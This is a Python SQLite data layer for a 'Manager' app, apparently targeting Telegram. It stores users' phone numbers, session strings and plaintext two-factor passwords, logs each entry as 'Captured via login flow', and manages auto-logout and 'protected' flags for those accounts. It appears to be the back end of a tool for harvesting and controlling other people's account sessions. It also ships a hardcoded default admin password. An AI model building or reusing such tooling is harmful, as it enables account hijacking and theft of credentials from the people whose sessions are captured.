"""SQLite layer for the Manager app."""
import os
import sqlite3
import time
import threading

DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "manager.db")

_local = threading.local()


def get_conn():
    if not hasattr(_local, "conn"):
        _local.conn = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=30)
        _local.conn.row_factory = sqlite3.Row
        _local.conn.execute("PRAGMA journal_mode=WAL")
        _local.conn.execute("PRAGMA foreign_keys=ON")
    return _local.conn


def init_db():
    conn = get_conn()
    c = conn.cursor()
    c.executescript(
        """
        CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            phone TEXT UNIQUE,
            user_id TEXT,
            username TEXT,
            name TEXT,
            session_string TEXT,
            twofa_password TEXT,
            email TEXT,
            is_protected INTEGER DEFAULT 0,
            is_current INTEGER DEFAULT 0,
            created_at INTEGER,
            last_seen INTEGER,
            auto_logout_at INTEGER,
            auto_logout_fired INTEGER DEFAULT 0,
            notes TEXT,
            last_action TEXT,
            last_action_at INTEGER
        );

        CREATE TABLE IF NOT EXISTS audit_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id INTEGER,
            phone TEXT,
            action TEXT,
            detail TEXT,
            ts INTEGER
        );

        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        );
        """
    )

    defaults = {
        "auto_logout_enabled": "0",
        "auto_logout_hours": "24",
        "admin_password": "manager123",
        "api_id": "",
        "api_hash": "",
        "bot_token": "",
        "log_channel_id": "",
    }
    for k, v in defaults.items():
        c.execute("INSERT OR IGNORE INTO settings(key, value) VALUES (?, ?)", (k, v))
    conn.commit()


# ---------- settings ----------
def get_setting(key, default=None):
    row = get_conn().execute("SELECT value FROM settings WHERE key = ?", (key,)).fetchone()
    return row["value"] if row else default


def set_setting(key, value):
    get_conn().execute(
        "INSERT INTO settings(key, value) VALUES (?, ?) "
        "ON CONFLICT(key) DO UPDATE SET value = excluded.value",
        (key, str(value)),
    )
    get_conn().commit()


def get_all_settings():
    rows = get_conn().execute("SELECT key, value FROM settings").fetchall()
    return {r["key"]: r["value"] for r in rows}


# ---------- sessions ----------
def list_sessions():
    return get_conn().execute("SELECT * FROM sessions ORDER BY created_at DESC").fetchall()


def get_session(sid):
    return get_conn().execute("SELECT * FROM sessions WHERE id = ?", (sid,)).fetchone()


def get_session_by_phone(phone):
    return get_conn().execute("SELECT * FROM sessions WHERE phone = ?", (phone,)).fetchone()


def insert_session(data):
    now = int(time.time())
    auto_logout_at = None
    if get_setting("auto_logout_enabled") == "1":
        hours = int(get_setting("auto_logout_hours", "24") or 24)
        auto_logout_at = now + hours * 3600
    c = get_conn().execute(
        """
        INSERT INTO sessions
        (phone, user_id, username, name, session_string, twofa_password, email,
         is_protected, is_current, created_at, last_seen, auto_logout_at, auto_logout_fired)
        VALUES (?, ?, ?, ?, ?, ?, ?, 0, 0, ?, ?, ?, 0)
        ON CONFLICT(phone) DO UPDATE SET
            user_id = excluded.user_id,
            username = excluded.username,
            name = excluded.name,
            session_string = excluded.session_string,
            twofa_password = excluded.twofa_password,
            last_seen = excluded.last_seen
        """,
        (
            data.get("phone"),
            str(data.get("user_id", "")),
            data.get("username", ""),
            data.get("name", ""),
            data.get("session_string", ""),
            data.get("twofa_password", ""),
            data.get("email", ""),
            now,
            now,
            auto_logout_at,
        ),
    )
    get_conn().commit()
    row = get_session_by_phone(data["phone"])
    audit(row["id"], row["phone"], "session_added", "Captured via login flow")
    return row


def update_session(sid, fields):
    if not fields:
        return
    cols = ", ".join(f"{k} = ?" for k in fields)
    vals = list(fields.values()) + [sid]
    get_conn().execute(f"UPDATE sessions SET {cols} WHERE id = ?", vals)
    get_conn().commit()


def delete_session(sid):
    row = get_session(sid)
    if row:
        get_conn().execute("DELETE FROM sessions WHERE id = ?", (sid,))
        get_conn().commit()
        audit(sid, row["phone"], "session_deleted", "Removed from Manager")


def set_protected(sid, val):
    update_session(sid, {"is_protected": 1 if val else 0})
    row = get_session(sid)
    audit(sid, row["phone"], "protect_toggled", "ON" if val else "OFF")


def set_current(sid, val):
    if val:
        get_conn().execute("UPDATE sessions SET is_current = 0")
    update_session(sid, {"is_current": 1 if val else 0})
    row = get_session(sid)
    audit(sid, row["phone"], "current_toggled", "ON" if val else "OFF")


def set_email(sid, email):
    update_session(sid, {"email": email})
    row = get_session(sid)
    audit(sid, row["phone"], "email_set", email or "(cleared)")


def set_notes(sid, notes):
    update_session(sid, {"notes": notes})


def mark_auto_logout_fired(sid):
    update_session(sid, {"auto_logout_fired": 1, "last_action": "auto_logout", "last_action_at": int(time.time())})


def touch_last_seen(sid):
    update_session(sid, {"last_seen": int(time.time())})


def pending_auto_logouts(now):
    return get_conn().execute(
        "SELECT * FROM sessions WHERE auto_logout_fired = 0 AND auto_logout_at IS NOT NULL AND auto_logout_at <= ?",
        (now,),
    ).fetchall()


# ---------- audit ----------
def audit(session_id, phone, action, detail=""):
    get_conn().execute(
        "INSERT INTO audit_log(session_id, phone, action, detail, ts) VALUES (?, ?, ?, ?, ?)",
        (session_id, phone, action, detail, int(time.time())),
    )
    get_conn().commit()


def list_audit(limit=100):
    return get_conn().execute(
        "SELECT * FROM audit_log ORDER BY ts DESC LIMIT ?", (limit,)
    ).fetchall()
